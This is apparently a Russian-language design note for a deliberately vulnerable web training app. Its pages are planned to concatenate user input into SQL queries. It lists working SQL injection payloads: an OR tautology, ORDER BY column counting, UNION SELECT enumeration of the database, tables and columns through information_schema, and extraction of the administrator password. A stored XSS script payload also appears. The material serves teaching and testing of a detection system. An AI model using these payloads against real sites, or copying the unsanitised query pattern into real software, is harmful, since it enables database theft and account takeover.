# ZPD

Первая страница:
  select email from users where user_name = аргумент

  Нужно просто написать тип "Тестовая sql injection Введите: Alex' OR '1'='1"

Вторая страница: 
  Тот же селект

  Нужно просто написать тип "Узнаем, количество полей в таблице, базу данных и таблицы Введите Alex' order by 1 -- -, увеличивая число пока не получите ошибку(количество полей) 
Введите Alex' union select null,null,database() -- -, узнаем базу данных(количество null + 1 должно быть как число полей наверное надо будет один добавить), 
Введите Alex' union select null,null,table_name from information_schema.tables where table_schema=database() -- -, узнаем таблицы (с null таже история)"

Третья страница:
  Тот же селект 

  Нужно просто написать тип "Посмотрим какие есть колонки в таблице auth_inf Введите Alex' union select null,null,column_name from information_schema.columns where table_name='auth_inf' limit 1,1 -- -, увидим поля(null)"

Четверая страница:
  Тот же селект 

  Нужно просто написать тип "Узнаем пароль пользователя administrator Введите administrator' union select null,null, passwd from auth_inf where user_id = 1"

Пятая страница:
  Сделать простой инсерт в таблицу users например или любой инсерт но понятный

  Написать тип "Проведем простую XSS атаку Введите в поле user_name: ЛЮбое_имя<script>alert("XSS");</script>"

Потом хорошо бы это все протестировать
Еще надо добавить по 2 страницы одна идет в немезиду другая игнорируется немезидой 
  
